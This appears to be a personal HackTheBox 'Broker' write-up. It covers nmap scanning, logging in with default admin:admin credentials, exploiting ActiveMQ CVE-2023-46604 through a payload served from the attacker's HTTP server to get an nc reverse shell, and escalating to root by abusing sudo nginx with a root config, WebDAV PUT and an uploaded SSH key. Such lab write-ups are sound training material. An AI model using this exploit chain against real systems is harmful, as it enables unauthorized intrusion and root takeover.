### NMAP 

```
sudo nmap -sC -sV -oN broker-nmap 10.10.11.243
```

![[Pasted image 20250426213029.png]]

Navigate to the website, but there's a login prompt 

![[Pasted image 20250426224206.png]]
- default creds `admin:admin` actually worked!

Apache ActiveMQ Website

![[Pasted image 20250426224330.png]]

Trying out existing exploit from metasploit.. 

Start metasploit database 

```
sudo msfdb run
```

![[Pasted image 20250426224510.png]]

Search for activemq once metasploit comes up 

```
search activemq
```

![[Pasted image 20250426224621.png]]

Select the first option
```
use 0 
```

```
show options
```

Configure the metasploit module settings

Run the module, but it fails 

![[Pasted image 20250427112147.png]]
- notice there is port 8161 that wasn't caught in nmap scan. 

Re-run nmap specifying all ports -p-

```
sudo nmap -p- --min-rate=10000 -oA broker-allports 10.10.11.243
```

![[Pasted image 20250427112823.png]]

Cutting out everything except for the port numbers and creating comma separated list. 

```
grep -oP '([\d]+)/open' broker-allports | awk -F/ '{print $1}' | tr '\n' '.'
```

Here is the port list 

![[HackTheBox/Linux/attachments/Pasted image 20250427113525.png]]

Now run full nmap scan with this port list 

```
sudo nmap -sC -sV -oA broker-nmap-2 -p '22,80,1883,5672,8161,44509,61613,61614,61616' 10.10.11.243
```

While this runs, search google for activemq exploits. 

There's a reddit post 

![[HackTheBox/Linux/attachments/Pasted image 20250427113930.png]]

CVE-2023-46604.

Google "activemq exploit github" 

Found a repo that will use metasploit to get a reverse shell. 

![[HackTheBox/Linux/attachments/Pasted image 20250502073845.png]]
- Clone the repo

Modifying the code in vs code a little bit 

![[HackTheBox/Linux/attachments/Pasted image 20250502074032.png]]

Stand up python server

```
python3 -m http.server
```

Execute the script. 

```
go run main.go -i 10.10.11.243 -p 61616 -u http://10.10.14.8:8000/poc-linux.xml
```

Set up nc listener

```
nc -lvnp 9001
```

No reverse shell. Let's encode the reverse shell one liner. 

![[HackTheBox/Linux/attachments/Pasted image 20250502074347.png]]
Use Burp to encode it in hex? 

![[HackTheBox/Linux/attachments/Pasted image 20250502074509.png]]
- Paste this payload into exploit script

This didn't work. 

Try searching for "html entity encode online"

![[HackTheBox/Linux/attachments/Pasted image 20250502074826.png]]

Fine one and paste this new encoded payload in and get reverse shell. 

![[HackTheBox/Linux/attachments/Pasted image 20250502074756.png]]

Get proper interactive shell. 

```
python3 -c 'import pty;pty.spawn("/bin/bash")'
```

```
stty raw -echo; fg
```

```
export TERM=xterm
```

We are the activemq user. 

### Privilege Escalation
#### Exploiting sudo privileges on /usr/sbin/nginx 
##### Create nginx config that runs as root & shares the entire file system
##### Enable the WebDAV PUT to upload files to server and upload SSH key
##### Alternatively upload cron entry for priv esc

Run `sudo -l`

![[HackTheBox/Linux/attachments/Pasted image 20250502075112.png]]

Cat nginx.conf and grep for every comment and redirect output to a file 

```
cat nginx.conf | grep -v '\#'| grep . > n
```


![[HackTheBox/Linux/attachments/Pasted image 20250502082127.png]]

We can modify this config. 

Copy `nginx.conf` to `/dev/shm/`

![[HackTheBox/Linux/attachments/Pasted image 20250502082316.png]]

Open the `nginx.conf` 

Change the user to root, change the pid to nginx2, remove some random ish, and paste in this info from 

```
/etc/nginx/sites-enabled/default
```

![[HackTheBox/Linux/attachments/Pasted image 20250502082800.png]]

Here is the new nginx.conf that should stand up a web server on 1337

![[HackTheBox/Linux/attachments/Pasted image 20250502085327.png]]

Then test the nginx.conf by running 

```
sudo nginx -c /dev/shm/nginx.conf
```

![[HackTheBox/Linux/attachments/Pasted image 20250502085656.png]]
- if there's no errors - it should be good

Check that nginx is running with 

```
ss -lntp
```

![[HackTheBox/Linux/attachments/Pasted image 20250502085757.png]]
Running 
```
curl localhost:1337/
```

but receive "403 Forbidden" which means we screwed up. 

![[HackTheBox/Linux/attachments/Pasted image 20250502085923.png]]
Modifying nginx.conf once again to turn autoindex on 
![[HackTheBox/Linux/attachments/Pasted image 20250502102432.png]]
 Re-running 
 ```
 sudo nginx -c /dev/shm/nginx.conf
```

The re-running 
```
curl localhost:1338
```

And it worked
![[HackTheBox/Linux/attachments/Pasted image 20250502102613.png]]

##### Enable the WebDAV PUT to upload files to server and upload SSH key

Modifying the nginx config again to enable webdav PUT
![[HackTheBox/Linux/attachments/Pasted image 20250502103925.png]]
Check this by re-running usual nginx -t and curl. 

Use curl to PUT a file from kali box to remote

![[HackTheBox/Linux/attachments/Pasted image 20250502104233.png]]
- this was successful

Now uploading an ssh key. 

```
ssh-keygen -f broker
```

![[HackTheBox/Linux/attachments/Pasted image 20250502104422.png]]
Here is what the request looks like in curl 
![[HackTheBox/Linux/attachments/Pasted image 20250502105106.png]]

Now try to ssh to box as root

```
ssh -i broker root@10.10.11.243
```

Got root.

![[HackTheBox/Linux/attachments/Pasted image 20250502104533.png]]
 

